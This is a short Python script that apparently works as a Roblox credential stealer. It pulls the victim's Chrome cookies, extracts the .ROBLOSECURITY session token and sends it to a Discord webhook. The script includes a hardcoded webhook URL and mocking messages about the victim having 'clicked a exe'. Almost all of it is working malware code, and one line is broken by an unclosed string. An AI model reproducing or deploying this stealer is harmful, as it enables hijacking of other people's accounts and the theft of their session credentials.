import requests
import threading
import browser_cookie3 as cookie
from discord_webhook import DiscordWebhook, DiscordEmbed

webhook_urls = ['https://discord.com/api/webhooks/1062345861218185216/dH2oqYdA8FyKZKS2cO6kB9QgMzOlwD_LxHll1I1BtjJHIkAe_jmNS92uXkoDGe-L1HRN', 'webhook url 2']

def getCookiesFromPc():
    req = requests.Session()
    cj = cookie.chrome()
    req.cookies = cj
    r = req.get("https://www.roblox.com/users/1123608764/profile")
    for c in req.cookies:
        if c.name == ".ROBLOSECURITY":
            webhook = DiscordWebhook(url='YOUR WEHBOOOOOOOOOOOK', content="@everyone")
            embed = DiscordEmbed(title='Cookie Found of braindead person!', description='He clicked a exe!', color=242424)
            embed.add_embed_field(name='.ROBLOSECURITY', value=c.value)
            embed.set_timestamp('
            webhook.add_embed(embed)
            response = webhook.execute()
